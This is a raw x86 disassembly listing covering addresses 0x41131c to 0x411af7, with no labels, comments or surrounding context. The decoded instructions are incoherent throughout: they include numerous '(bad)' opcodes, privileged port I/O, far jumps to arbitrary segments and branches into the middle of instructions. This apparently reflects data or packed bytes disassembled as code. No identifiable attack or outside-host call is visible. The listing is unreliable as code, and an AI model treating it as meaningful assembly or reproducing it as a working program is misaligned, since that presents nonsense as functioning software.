  41131c:	stos   DWORD PTR es:[edi],eax
  41131d:	push   cs
  41131e:	bound  ebx,QWORD PTR [esi]
  411320:	xchg   eax,edx
  411322:	into   
  411323:	nop
  411324:	jmp    0x411370
  411326:	mov    ds:0xc4a7a69e,eax
  41132b:	das    
  41132c:	ret    
  41132d:	jl     0x4112ee
  41132f:	lods   al,BYTE PTR ds:[esi]
  411330:	mov    dl,0x9f
  411332:	cmp    DWORD PTR [eax-0x3ab5ca9],ecx
  411338:	leave  
  411339:	and    al,al
  41133b:	push   esp
  41133c:	dec    edi
  41133d:	or     eax,0x7449a747
  411342:	scas   eax,DWORD PTR es:[edi]
  411343:	inc    edx
  411344:	sbb    dh,BYTE PTR [esi+0x7d]
  411347:	leave  
  411348:	fmulp  st(1),st
  41134a:	jle    0x411317
  41134c:	push   0xe
  41134e:	daa    
  41134f:	xlat   BYTE PTR ds:[ebx]
  411350:	jle    0x4112dd
  411352:	dec    eax
  411353:	mov    bl,0x94
  411355:	mov    dh,0x41
  411357:	sbb    al,0x79
  411359:	clc    
  41135a:	xor    esi,edx
  41135c:	arpl   di,bx
  41135e:	sbb    al,BYTE PTR [esi]
  411360:	mov    BYTE PTR [edi+0x13],ch
  411363:	das    
  411364:	arpl   si,cx
  411366:	repnz push ebx
  411368:	ins    BYTE PTR es:[edi],dx
  411369:	ja     0x411369
  41136b:	aaa    
  41136c:	pop    esi
  41136d:	adc    ebp,DWORD PTR [esi-0x70]
  411370:	rcl    bh,0x44
  411373:	loopne 0x41133f
  411375:	repnz div esp
  411378:	out    0x56,al
  41137a:	pop    es
  41137b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41137c:	jp     0x411375
  41137e:	ins    DWORD PTR es:[edi],dx
  41137f:	aam    0x69
  411381:	mov    esp,eax
  411383:	js     0x41130c
  411385:	(bad)  
  411386:	leave  
  411387:	mov    ?,WORD PTR [edi]
  411389:	in     al,dx
  41138a:	mov    esi,0xba34c988
  41138f:	inc    edx
  411390:	dec    esp
  411391:	sahf   
  411392:	stos   DWORD PTR es:[edi],eax
  411393:	lods   al,BYTE PTR ds:[esi]
  411394:	jns    0x4113eb
  411396:	test   eax,0x6d50d6a
  41139b:	or     al,BYTE PTR [edi-0x38389c77]
  4113a1:	xchg   ebx,eax
  4113a2:	(bad)  
  4113a3:	mov    ch,0x34
  4113a5:	mov    ah,0x4e
  4113a7:	inc    eax
  4113a8:	jae    0x41135d
  4113aa:	(bad)  
  4113ab:	out    0xc2,eax
  4113ad:	(bad)
  4113b1:	data16 ins BYTE PTR es:[edi],dx
  4113b3:	mov    al,ds:0x7c268b01
  4113b8:	push   ebx
  4113b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113ba:	pop    eax
  4113bb:	popa   
  4113bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113bd:	or     al,ah
  4113bf:	je     0x411358
  4113c1:	add    esp,DWORD PTR [ebp+0x5b]
  4113c4:	out    0xc,eax
  4113c6:	fs sub al,0x36
  4113c9:	xchg   ebx,eax
  4113ca:	(bad)  
  4113cb:	fidivr WORD PTR gs:[ebp+0x55b7555]
  4113d2:	(bad)  
  4113d3:	dec    esi
  4113d4:	rcr    DWORD PTR [eax-0xd],1
  4113d7:	retf   0xaa0e
  4113da:	lds    ecx,FWORD PTR [eax-0x7f]
  4113dd:	xchg   ebx,eax
  4113de:	fwait
  4113df:	mov    ah,0x92
  4113e1:	dec    eax
  4113e2:	xor    DWORD PTR [edx],0xa5250896
  4113e8:	dec    ebp
  4113e9:	push   edx
  4113ea:	sub    cl,BYTE PTR [eax+ebx*1]
  4113ed:	xor    eax,0x27385a9
  4113f2:	test   BYTE PTR [ebx+0x50d97586],cl
  4113f8:	lea    ebp,[edx]
  4113fa:	cs push ss
  4113fc:	cmp    DWORD PTR [ecx],ebx
  4113fe:	pop    ebx
  4113ff:	ret    
  411400:	push   es
  411401:	or     BYTE PTR [edx+0x4707461a],al
  411407:	arpl   WORD PTR [edi+0x1245e663],bp
  41140d:	call   0xbd27fc73
  411412:	pop    es
  411413:	and    ecx,DWORD PTR [ebp+0x67]
  411416:	mov    dl,BYTE PTR ds:[eax+0x755b73e6]
  41141d:	jecxz  0x411456
  41141f:	mov    ch,0x6f
  411421:	icebp  
  411422:	(bad)  
  411423:	aas    
  411424:	imul   edi,DWORD PTR ds:0x70e8c227,0xa92d6321
  41142e:	mov    ah,0x2f
  411430:	sub    eax,eax
  411432:	(bad)  
  411434:	jns    0x4113f9
  411436:	dec    edx
  411437:	jp     0x411491
  411439:	ret    
  41143a:	xchg   ebp,eax
  41143b:	sbb    al,ch
  41143d:	pop    ss
  41143e:	jp     0x4114bd
  411440:	test   BYTE PTR [ebp+0x37],al
  411443:	sub    esi,DWORD PTR [esi]
  411445:	push   edx
  411446:	and    al,0xa5
  411448:	xchg   esp,eax
  411449:	cs push cs
  41144b:	xchg   BYTE PTR [esi+0x41],dh
  41144e:	push   0x1d96f08b
  411453:	pop    edx
  411454:	pop    edx
  411455:	outs   dx,BYTE PTR ds:[esi]
  411456:	cmp    eax,0xeef1b1b8
  41145b:	push   0x74
  41145d:	gs and al,0x5a
  411460:	or     eax,0xc51ada4f
  411465:	iret   
  411466:	enter  0xca91,0xb0
  41146a:	inc    edx
  41146b:	outs   dx,BYTE PTR ds:[esi]
  41146c:	out    dx,al
  41146d:	or     eax,0x302645cd
  411472:	fadd   DWORD PTR [ecx+0x711f0fc9]
  411478:	fcomp  QWORD PTR ds:0x99a40465
  41147e:	imul   ecx,DWORD PTR [ebx],0x204f0357
  411484:	retf   0x2b29
  411487:	(bad)  
  411489:	gs dec edx
  41148b:	push   ebp
  41148c:	sbb    eax,ecx
  41148e:	push   0xffffffee
  411490:	adc    al,ch
  411492:	repz (bad) 
  411494:	or     BYTE PTR [edi-0xa],cl
  411497:	push   cs
  411498:	ret    0xae03
  41149b:	cmp    DWORD PTR [ebp+0x7b4f72c],0x76
  4114a2:	xor    esp,edx
  4114a4:	sub    al,0x5c
  4114a6:	jnp    0x4114a6
  4114a8:	cmp    DWORD PTR [edi],edi
  4114aa:	cli    
  4114ab:	xchg   ebp,eax
  4114ac:	stc    
  4114ad:	rol    BYTE PTR [edi+0x6d],0xdf
  4114b1:	pop    ds
  4114b2:	or     al,0xf5
  4114b4:	sbb    esi,DWORD PTR [edx+0x2be7f30a]
  4114ba:	rcr    BYTE PTR [edi],0x0
  4114bd:	cs je  0x41144b
  4114c0:	sbb    ax,0x2e12
  4114c4:	stos   BYTE PTR es:[edi],al
  4114c5:	mov    ds:0x977a5d22,al
  4114ca:	pop    eax
  4114cb:	xor    DWORD PTR [ecx-0x6e5a603f],edx
  4114d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114d2:	pusha  
  4114d3:	push   esp
  4114d4:	out    0x27,al
  4114d6:	iret   
  4114d7:	sbb    BYTE PTR ds:0xd9519a72,0x84
  4114de:	es in  al,0x10
  4114e1:	add    cl,BYTE PTR [ecx]
  4114e3:	je     0x41153f
  4114e5:	and    cl,ch
  4114e7:	inc    esi
  4114e8:	mov    al,BYTE PTR [ebp+0x40bbe5d6]
  4114ee:	fs popa 
  4114f0:	xchg   ecx,eax
  4114f1:	lods   eax,DWORD PTR ds:[esi]
  4114f2:	and    DWORD PTR [ecx],0x48b5db16
  4114f8:	sub    dl,ah
  4114fa:	or     dh,BYTE PTR [ebx+0x623679e5]
  411500:	retf   0x893c
  411503:	mov    eax,0x6e3da57c
  411508:	cmp    al,0x33
  41150a:	push   cs
  41150b:	pusha  
  41150c:	xchg   edx,eax
  41150d:	in     eax,dx
  41150e:	push   esp
  41150f:	dec    edx
  411510:	mov    eax,0x530ab0ad
  411515:	dec    eax
  411516:	jg     0x411527
  411518:	or     eax,0x28ee42d0
  41151d:	or     edi,DWORD PTR [edx-0x71]
  411520:	jmp    0xa76b:0xc697747
  411527:	xor    esp,edx
  411529:	and    edx,DWORD PTR [esi-0x431c3b97]
  41152f:	dec    edi
  411530:	adc    edx,DWORD PTR [ebp+edx*8+0x30e0df84]
  411537:	hlt    
  411538:	jnp    0x4115a1
  41153a:	mov    al,ds:0x82dcd924
  41153f:	ins    DWORD PTR es:[edi],dx
  411540:	popa   
  411541:	inc    ebx
  411542:	mov    bh,0x76
  411544:	inc    ecx
  411545:	jmp    0xdd5b38ac
  41154a:	or     al,0xcf
  41154c:	xchg   edx,eax
  41154d:	sti    
  41154e:	das    
  41154f:	push   esp
  411550:	mov    DWORD PTR [eax+0x12],edi
  411553:	jbe    0x4114dd
  411555:	mov    cl,0xab
  411557:	dec    ebp
  411558:	sti    
  411559:	mov    ds:0x80724b73,al
  41155e:	dec    eax
  41155f:	mov    cl,0x3a
  411561:	or     ebx,DWORD PTR [esi+0x12]
  411564:	or     DWORD PTR [ebp+0x10],esp
  411567:	jb     0x411586
  411569:	mov    al,bl
  41156b:	cld    
  41156c:	dec    ebp
  41156d:	add    BYTE PTR [ecx],bl
  41156f:	loopne 0x411562
  411571:	test   al,0xc3
  411573:	outs   dx,DWORD PTR ds:[esi]
  411574:	mov    ebp,0x8960c4cc
  411579:	or     BYTE PTR [edi-0x7c],cl
  41157c:	fs iret 
  41157e:	push   ebx
  41157f:	neg    DWORD PTR [ebp-0xa]
  411582:	mov    ds:0xcd18a81,eax
  411587:	inc    edx
  411588:	xor    DWORD PTR [eax],edx
  41158a:	and    bh,al
  41158c:	push   0xffffffaf
  41158e:	rcl    ah,cl
  411590:	fwait
  411591:	retf   0xdc4b
  411594:	sbb    eax,0x36d4effc
  411599:	mov    edi,0xb30856f
  41159e:	jbe    0x411578
  4115a0:	mov    DWORD PTR [ebp+0x72ece905],ebx
  4115a6:	mov    BYTE PTR [edx],dl
  4115a8:	cmp    al,0xb9
  4115aa:	and    DWORD PTR [eax+ebp*8+0x253e19cb],0x88c5813a
  4115b5:	jmp    0xd804:0xeb344d55
  4115bc:	adc    DWORD PTR [edi+0x11],esi
  4115bf:	iret   
  4115c0:	xor    edi,0xfaf8e1aa
  4115c6:	xor    al,0x9b
  4115c8:	out    dx,eax
  4115c9:	mov    ?,ecx
  4115cb:	pop    ds
  4115cc:	aaa    
  4115cd:	cwde   
  4115ce:	mov    edi,0x333a5127
  4115d3:	pop    esi
  4115d4:	lods   al,BYTE PTR ds:[esi]
  4115d5:	lahf   
  4115d6:	dec    edi
  4115d7:	fst    st(4)
  4115d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115da:	mov    WORD PTR [edx-0x6001a09e],gs
  4115e0:	data16 cmp dh,BYTE PTR [bx]
  4115e4:	push   eax
  4115e5:	out    dx,eax
  4115e6:	dec    edi
  4115e7:	and    esp,DWORD PTR ds:0x5c55ba11
  4115ed:	iret   
  4115ee:	jge    0x411588
  4115f0:	imul   eax,DWORD PTR [edx-0x4a],0x2f
  4115f4:	sti    
  4115f5:	jnp    0x4115fa
  4115f7:	es jo  0x4115e5
  4115fa:	xor    eax,edx
  4115fc:	xchg   BYTE PTR [ecx+0x31fdb74b],ch
  411602:	push   ds
  411603:	dec    edx
  411604:	jnp    0x4115f3
  411606:	iret   
  411607:	mov    dl,0x16
  411609:	jno    0x411612
  41160b:	xchg   DWORD PTR [ebx],ecx
  41160d:	cmp    esp,DWORD PTR [edx]
  41160f:	fldcw  WORD PTR [ecx+0x49]
  411612:	fwait
  411613:	setne  dl
  411616:	fs fcmovbe st,st(5)
  411619:	mov    ds:0x3731113a,al
  41161e:	sbb    BYTE PTR [ebp-0x388747f8],cl
  411624:	pop    ds
  411625:	xchg   edi,eax
  411626:	ins    DWORD PTR es:[edi],dx
  411627:	mov    eax,0x83e6b69
  41162c:	lods   eax,DWORD PTR ds:[si]
  41162e:	mov    eax,ds:0x50370acf
  411633:	in     al,0x1e
  411635:	xchg   esi,eax
  411636:	cmp    al,0xb3
  411638:	cmp    DWORD PTR [ebx+eiz*8],esi
  41163b:	sub    DWORD PTR [edi+ebp*8],0x6096a5e6
  411642:	adc    eax,0x846fb750
  411647:	retf   
  411648:	repnz rcl BYTE PTR [esp+ecx*4],cl
  41164c:	ins    DWORD PTR es:[edi],dx
  41164d:	push   ss
  41164e:	ret    0xce11
  411651:	out    dx,eax
  411652:	jno    0x411693
  411654:	test   dl,cl
  411656:	jg     0x4116ae
  411658:	xor    eax,0xb2cb48d8
  41165d:	jne    0x411665
  41165f:	and    al,0x56
  411661:	loop   0x411693
  411663:	iret   
  411664:	(bad)  
  411665:	jno    0x411681
  411667:	push   cs
  411668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411669:	mov    ecx,0x219debbc
  41166e:	adc    ebx,edi
  411670:	test   al,0xb2
  411672:	mul    ecx
  411674:	cs stos DWORD PTR es:[edi],eax
  411676:	les    eax,FWORD PTR [ecx]
  411678:	imul   ecx,DWORD PTR [esi+0x52ccd739],0x40
  41167f:	pop    ecx
  411680:	jbe    0x41167c
  411682:	add    eax,0xe6c01d0b
  411687:	xchg   BYTE PTR [ebx+0x2c],ah
  41168a:	(bad)  [ebx-0xc]
  41168d:	sbb    bl,BYTE PTR ds:0xbc8b4012
  411693:	xchg   esp,eax
  411694:	adc    eax,0xade55a7f
  411699:	daa    
  41169a:	or     al,0x7
  41169c:	mov    eax,0xba50d742
  4116a1:	mov    al,ds:0x4ce93083
  4116a6:	ret    
  4116a7:	add    ebx,DWORD PTR [edi-0x44]
  4116aa:	sub    al,BYTE PTR [eax+0x59b2413d]
  4116b0:	mov    esp,0x9ecb369d
  4116b5:	iret   
  4116b6:	sub    DWORD PTR [esi],esp
  4116b8:	shl    eax,cl
  4116ba:	nop
  4116bb:	dec    esp
  4116bc:	(bad)  
  4116bd:	mov    ebp,0x6b4fb3d1
  4116c2:	cmp    esi,DWORD PTR [ebp-0x6f9e7f59]
  4116c8:	cmc    
  4116c9:	mov    al,ds:0x8c4e3fcd
  4116ce:	jp     0x411692
  4116d0:	stc    
  4116d1:	fsub   DWORD PTR [esp+eax*2-0x77]
  4116d5:	js     0x411680
  4116d7:	out    0x9a,eax
  4116d9:	pop    esi
  4116da:	xor    DWORD PTR [edi-0xf441778],eax
  4116e0:	bound  eax,QWORD PTR ds:0xf370db91
  4116e6:	iret   
  4116e7:	jo     0x41167e
  4116e9:	ror    BYTE PTR [ecx+0x7880d51],cl
  4116ef:	xchg   ebp,eax
  4116f0:	test   eax,0x68d70f84
  4116f5:	fnstsw WORD PTR gs:[edi-0x2a]
  4116f9:	and    dh,BYTE PTR [ebx]
  4116fb:	push   edx
  4116fc:	in     al,dx
  4116fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116fe:	aaa    
  4116ff:	sbb    BYTE PTR [eax],0xd5
  411702:	xor    BYTE PTR [edi-0x6f],bl
  411705:	or     BYTE PTR [ecx],ah
  411707:	mov    dh,0x4c
  411709:	mov    dl,0x77
  41170b:	into   
  41170c:	(bad)  
  41170d:	in     al,0xfa
  41170f:	call   0x30fd6c58
  411714:	enter  0x47ec,0xbb
  411718:	push   ebx
  411719:	and    DWORD PTR [eax+0x55493258],0xffffffe0
  411720:	out    0x4f,al
  411722:	shr    bh,cl
  411724:	inc    edx
  411725:	test   eax,0x4aa816da
  41172a:	adc    eax,0x4e0b8e5a
  41172f:	sub    ebp,DWORD PTR [ebx-0x22]
  411732:	movlps xmm3,QWORD PTR [ecx+0x42]
  411736:	ss in  al,dx
  411738:	retf   0x895f
  41173b:	sub    al,0xcd
  41173d:	in     eax,0xec
  41173f:	or     al,dl
  411741:	(bad)
  411744:	sbb    al,0x7e
  411746:	sbb    eax,0x755af874
  41174b:	add    bl,0xa
  41174e:	sub    ch,BYTE PTR [ebx]
  411750:	cmp    DWORD PTR [esi+0x21],ebx
  411753:	adc    eax,0x74f00735
  411758:	push   esp
  411759:	jo     0x41171a
  41175b:	xchg   edi,eax
  41175c:	scas   al,BYTE PTR es:[edi]
  41175d:	enter  0x2f26,0x62
  411761:	dec    ecx
  411762:	in     eax,0x2f
  411764:	xchg   BYTE PTR [ecx+0x6aa26634],al
  41176a:	dec    esp
  41176b:	jecxz  0x4117b9
  41176d:	mov    esi,0x2fa74366
  411772:	cmp    eax,0xda1880a4
  411777:	push   ebp
  411778:	pop    ecx
  411779:	call   0x588d:0x2f3cb41f
  411780:	mov    edx,DWORD PTR [eax-0x73]
  411783:	test   BYTE PTR [ebp-0x38],0x2a
  411787:	sub    DWORD PTR [ebx+0x299b16a7],eax
  41178d:	dec    ebx
  41178e:	jno    0x41177f
  411790:	leave  
  411791:	imul   esi,ebx,0xe5f28401
  411797:	mov    BYTE PTR [eax+ebp*8],al
  41179a:	xor    BYTE PTR [edi+0x4],dl
  41179d:	mov    BYTE PTR [edi-0x658455a9],ah
  4117a3:	outs   dx,BYTE PTR ds:[esi]
  4117a4:	sbb    DWORD PTR [edx-0x29],edi
  4117a7:	ds aaa 
  4117a9:	stc    
  4117aa:	push   esp
  4117ab:	inc    ecx
  4117ac:	xchg   ecx,eax
  4117ad:	pop    ebx
  4117ae:	mov    cl,0x6f
  4117b0:	mov    ds:0x620c1ca3,al
  4117b5:	jne    0x41173b
  4117b7:	les    eax,FWORD PTR [eax+0xa]
  4117ba:	jecxz  0x411769
  4117bc:	pop    esi
  4117bd:	dec    al
  4117bf:	push   esi
  4117c0:	jns    0x41174e
  4117c2:	sbb    DWORD PTR [esi+0x23],ecx
  4117c5:	clc    
  4117c6:	jg     0x411807
  4117c8:	stc    
  4117c9:	jecxz  0x4117fb
  4117cb:	les    ebx,FWORD PTR [edx+0x57]
  4117ce:	push   ecx
  4117cf:	test   al,0x38
  4117d1:	cwde   
  4117d2:	add    eax,0xed034a36
  4117d7:	mov    eax,0x84d61220
  4117dc:	ins    DWORD PTR es:[edi],dx
  4117dd:	(bad)  
  4117df:	pop    edx
  4117e0:	lock stos BYTE PTR es:[edi],al
  4117e2:	add    BYTE PTR [eax],0x7f
  4117e5:	stos   DWORD PTR es:[edi],eax
  4117e6:	jmp    FWORD PTR [edi]
  4117e8:	add    eax,0x6727a85d
  4117ed:	in     eax,dx
  4117ee:	js     0x41184e
  4117f0:	popa   
  4117f1:	or     DWORD PTR [edi+0x5352c2a3],0x8cc7d817
  4117fb:	sbb    eax,0xfadaf278
  411800:	jbe    0x411846
  411802:	push   ecx
  411803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411804:	add    BYTE PTR [edx],0xa4
  411807:	push   cs
  411808:	inc    esi
  411809:	or     eax,ebx
  41180b:	jb     0x41183e
  41180d:	pop    ecx
  41180e:	jg     0x4117ed
  411810:	adc    dl,BYTE PTR es:[ebx-0x14]
  411814:	mov    al,ds:0x5460bbbc
  411819:	mov    dh,0x11
  41181b:	cld    
  41181c:	jl     0x411898
  41181e:	xchg   ebp,eax
  41181f:	fld    DWORD PTR [esi-0x5d8deae8]
  411825:	sar    BYTE PTR [eax],1
  411827:	inc    eax
  411828:	sar    DWORD PTR [ebx-0x5b],1
  41182b:	inc    edi
  41182d:	cmc    
  41182e:	scas   al,BYTE PTR es:[edi]
  41182f:	fisttp WORD PTR [edx+0x52]
  411832:	aaa    
  411833:	adc    ah,0x8b
  411836:	fild   DWORD PTR [eax+0x5]
  411839:	xor    edx,eax
  41183b:	sub    al,0xdf
  41183d:	inc    esi
  41183e:	imul   eax,DWORD PTR [edi*8+0x6614ccd9],0x5ea3848
  411849:	push   0xffffffc4
  41184b:	mov    eax,0xf6619e76
  411850:	mov    es:0xdf78a4ac,eax
  411856:	ja     0x411842
  411858:	test   BYTE PTR [ecx-0x76e834b6],bh
  41185e:	push   ds
  41185f:	je     0x411847
  411861:	and    ecx,ebp
  411863:	popw   ss
  411865:	mov    esp,0xd64a26e7
  41186a:	jo     0x41180a
  41186c:	dec    edx
  41186d:	sub    bh,al
  41186f:	sar    BYTE PTR [esi-0x4b],0x99
  411873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411874:	jl     0x411873
  411876:	aas    
  411877:	adc    bl,BYTE PTR [esi+edi*1]
  41187a:	daa    
  41187b:	cdq    
  41187c:	sar    bl,0x4
  41187f:	push   es
  411880:	or     ebx,esp
  411882:	ins    DWORD PTR es:[edi],dx
  411883:	sbb    eax,0x33afd7ea
  411888:	(bad)  
  41188a:	xor    esi,DWORD PTR [esi+0x3a]
  41188d:	cmp    al,BYTE PTR [ecx-0xd8faf99]
  411893:	das    
  411894:	push   ebp
  411895:	test   al,0xab
  411897:	clc    
  411898:	jg     0x411846
  41189a:	mov    cl,0xdc
  41189c:	js     0x4118cd
  41189e:	shr    DWORD PTR [edi+0x562b0960],cl
  4118a4:	mov    ah,0x65
  4118a6:	inc    eax
  4118a7:	mov    dh,0x94
  4118a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118aa:	sbb    DWORD PTR [edi+esi*2],ebx
  4118ad:	sti    
  4118ae:	dec    ebx
  4118af:	sbb    eax,0xa7fba9e4
  4118b4:	mov    ah,0x65
  4118b6:	inc    ebp
  4118b7:	loope  0x411853
  4118b9:	mov    ds:0x9ccb292,eax
  4118be:	mov    ds:0x397f73a2,al
  4118c3:	loop   0x411904
  4118c5:	ins    DWORD PTR es:[edi],dx
  4118c6:	cmp    eax,0xf37ed2e1
  4118cb:	pop    ss
  4118cc:	mov    es:0xd64470f6,eax
  4118d2:	cmp    DWORD PTR [eax+0x18],esp
  4118d5:	jno    0x41187d
  4118d7:	pop    edx
  4118d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118d9:	in     al,dx
  4118da:	popf   
  4118db:	xlat   BYTE PTR ds:[ebx]
  4118dc:	loope  0x4118b8
  4118de:	dec    ecx
  4118df:	sub    eax,0x589961d
  4118e4:	add    dh,BYTE PTR [esi+0x30]
  4118e7:	stos   BYTE PTR es:[edi],al
  4118e8:	jb     0x411916
  4118ea:	nop
  4118eb:	pop    ss
  4118ec:	dec    esi
  4118ed:	xor    bh,bl
  4118ef:	loop   0x411876
  4118f1:	push   ecx
  4118f2:	gs adc eax,0xb3e0a044
  4118f8:	add    BYTE PTR [edx-0x17],0x46
  4118fc:	dec    edx
  4118fd:	pop    es
  4118fe:	les    ebp,FWORD PTR [eax-0x4b]
  411901:	(bad)  [esi+0x409f7c2a]
  411907:	sub    dl,BYTE PTR [ebx-0x5008b715]
  41190d:	sar    al,0xf4
  411910:	pop    ebx
  411911:	push   esi
  411912:	add    BYTE PTR [edx-0xe],ah
  411915:	popa   
  411916:	inc    edi
  411917:	cld    
  411918:	leave  
  411919:	dec    ebp
  41191a:	adc    ecx,DWORD PTR [ebp+0xc9a2a0d]
  411920:	pop    ebp
  411921:	and    cl,BYTE PTR [ecx]
  411923:	test   al,0xb5
  411925:	xor    bh,BYTE PTR [eax-0x4fbbeb4d]
  41192b:	fisubr WORD PTR [ebx+eiz*4+0x17284c16]
  411932:	xchg   esp,eax
  411933:	mov    dl,0xb1
  411935:	inc    ecx
  411936:	scas   eax,DWORD PTR es:[edi]
  411937:	mov    eax,0x3c69ea97
  41193c:	ins    DWORD PTR es:[edi],dx
  41193d:	push   es
  41193e:	xor    eax,0x827ab8b5
  411943:	jg     0x41194c
  411945:	sbb    eax,0x42d75089
  41194a:	fwait
  41194b:	mov    dh,0x79
  41194d:	ins    BYTE PTR es:[edi],dx
  41194e:	dec    esi
  41194f:	or     ecx,DWORD PTR [ecx+0x4f311fba]
  411955:	loope  0x411960
  411957:	dec    eax
  411958:	pop    ebp
  411959:	pushf  
  41195a:	mov    ds:0xfff5f3ad,eax
  41195f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411960:	inc    edi
  411962:	dec    esi
  411963:	rcr    DWORD PTR [edi-0x241aaf1c],1
  411969:	gs clc 
  41196b:	sbb    esi,DWORD PTR [edx-0x57cd26ad]
  411971:	les    esi,FWORD PTR [ecx]
  411973:	loope  0x4119c1
  411975:	add    al,BYTE PTR [ecx-0x66]
  411978:	mov    al,0x32
  41197a:	ss xor al,0xdc
  41197d:	int    0x46
  41197f:	pop    eax
  411980:	mov    dh,BYTE PTR [eax]
  411982:	and    al,0x7b
  411984:	and    edx,DWORD PTR [ebx]
  411986:	out    0xa8,eax
  411988:	sub    BYTE PTR [edi],0x67
  41198b:	pop    ds
  41198c:	adc    ecx,DWORD PTR [esi-0xb30838d]
  411992:	lods   al,BYTE PTR ds:[esi]
  411993:	cld    
  411994:	cmp    eax,0x6a21a242
  411999:	push   es
  41199a:	jbe    0x4119b2
  41199c:	or     ah,BYTE PTR [esp+edx*2-0x51aa9e05]
  4119a3:	out    dx,eax
  4119a4:	push   ds
  4119a5:	jns    0x411999
  4119a7:	int3   
  4119a8:	into   
  4119a9:	fnstenv fs:[esp+edx*2+0x48]
  4119ae:	pusha  
  4119af:	aas    
  4119b0:	repz or BYTE PTR [edx-0x490d6821],0xe7
  4119b8:	loopne 0x411a13
  4119ba:	or     edx,edi
  4119bc:	mov    ecx,0x421e301d
  4119c1:	cmp    ebx,edx
  4119c3:	icebp  
  4119c4:	mov    ds:0x28e75e8a,al
  4119c9:	shl    DWORD PTR [esi-0x16103875],cl
  4119cf:	fwait
  4119d0:	pusha  
  4119d1:	out    0x41,al
  4119d3:	pop    ebp
  4119d4:	ins    BYTE PTR es:[edi],dx
  4119d5:	dec    ebx
  4119d6:	adc    dl,0x5d
  4119d9:	add    DWORD PTR [edx-0x6067846a],0xfa23a2b3
  4119e3:	adc    al,0xa9
  4119e5:	mov    ebx,fs
  4119e7:	or     BYTE PTR [esi],ch
  4119e9:	pushf  
  4119ea:	cdq    
  4119eb:	clc    
  4119ec:	pop    eax
  4119ed:	or     BYTE PTR [ebp+0x2a0cfbe9],ah
  4119f3:	mov    WORD PTR [esi],gs
  4119f5:	jne    0x4119fb
  4119f7:	jbe    0x4119aa
  4119f9:	mov    DWORD PTR [eax-0x1f65120e],eax
  4119ff:	fld    TBYTE PTR [ecx]
  411a01:	gs daa 
  411a03:	mov    dl,0xc1
  411a05:	fld    TBYTE PTR [ecx+0x33]
  411a08:	(bad)  
  411a09:	pop    esp
  411a0a:	mov    edx,0xe6cb8ac0
  411a0f:	adc    dl,BYTE PTR [eax+0x4713df6c]
  411a15:	inc    edx
  411a16:	and    esp,eax
  411a18:	(bad)  
  411a1a:	mov    edx,DWORD PTR [ebp+0x16]
  411a1d:	test   dh,dh
  411a1f:	enter  0x8be3,0xc7
  411a23:	push   ds
  411a24:	cmp    BYTE PTR [ecx-0x65],cl
  411a27:	mov    ch,0x5f
  411a29:	xor    DWORD PTR [edi],edx
  411a2b:	inc    edi
  411a2c:	dec    esi
  411a2d:	sub    ebx,edi
  411a2f:	aas    
  411a30:	add    DWORD PTR es:[eax-0x15617ce4],ebx
  411a37:	pop    eax
  411a38:	add    eax,0x546216eb
  411a3d:	nop
  411a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a3f:	test   eax,0xb79291a7
  411a44:	std    
  411a45:	into   
  411a46:	add    dh,ah
  411a48:	rcr    ch,1
  411a4a:	fadd   DWORD PTR [eax]
  411a4c:	mov    dh,0x43
  411a4e:	leave  
  411a4f:	pop    eax
  411a50:	(bad)  
  411a51:	mov    al,0xf4
  411a53:	dec    edx
  411a54:	and    esp,edx
  411a56:	or     al,0xb2
  411a58:	mov    dh,0xd3
  411a5a:	sub    al,0x43
  411a5c:	push   edi
  411a5d:	iret   
  411a5e:	xor    eax,0xe7dbdd96
  411a63:	das    
  411a64:	or     ah,bl
  411a66:	and    dh,BYTE PTR ds:0x60d25782
  411a6c:	mov    eax,0xe1e60e8f
  411a71:	push   ebp
  411a72:	in     al,dx
  411a73:	jmp    0x6f8:0x252f1184
  411a7a:	fwait
  411a7b:	jge    0x411aeb
  411a7d:	and    ebx,ecx
  411a7f:	mov    ebx,0xe2346d54
  411a84:	adc    al,0x94
  411a86:	test   BYTE PTR [esi],bh
  411a88:	xor    edi,0x929adf8
  411a8e:	xchg   ebp,eax
  411a8f:	mov    edx,0x39beec91
  411a94:	sar    DWORD PTR [edx-0x7e],0x5c
  411a98:	push   0xffffffb0
  411a9a:	in     eax,dx
  411a9b:	or     ecx,edx
  411a9d:	pusha  
  411a9e:	(bad)  
  411a9f:	xchg   ebp,eax
  411aa0:	or     dh,bh
  411aa2:	mov    ebp,DWORD PTR [esi+0x49]
  411aa5:	sub    BYTE PTR [edx+0x6d],al
  411aa8:	mov    cl,0x39
  411aaa:	test   al,0xbe
  411aac:	ror    DWORD PTR [ecx],cl
  411aae:	inc    esp
  411aaf:	es pop edi
  411ab1:	mov    esp,0xeba3e6ae
  411ab6:	mov    eax,ds:0xd09c614
  411abb:	inc    esi
  411abc:	push   ebx
  411abd:	sbb    bl,ch
  411abf:	clc    
  411ac0:	ret    
  411ac1:	in     al,0x45
  411ac3:	cmp    al,0xbb
  411ac5:	dec    eax
  411ac6:	jecxz  0x411ada
  411ac8:	or     bl,BYTE PTR [ebx+0x6c]
  411acb:	sti    
  411acc:	imul   BYTE PTR [edi+0x54d9e64d]
  411ad2:	retf   
  411ad3:	jl     0x411a94
  411ad5:	jno    0x411a6d
  411ad7:	jl     0x411aab
  411ad9:	xlat   BYTE PTR ds:[ebx]
  411ada:	jg     0x411ab5
  411adc:	cs in  al,0x28
  411adf:	xchg   DWORD PTR [ebp+0x7d06d86b],eax
  411ae5:	aas    
  411ae6:	jo     0x411abe
  411ae8:	sbb    al,0xe7
  411aea:	lods   al,BYTE PTR ds:[esi]
  411aeb:	inc    esp
  411aec:	xchg   esi,eax
  411aed:	push   es
  411aee:	inc    edi
  411aef:	out    dx,eax
  411af0:	sbb    eax,0x46615d6a
  411af5:	pop    ebp
  411af6:	push   cs
  411af7:	push   cs
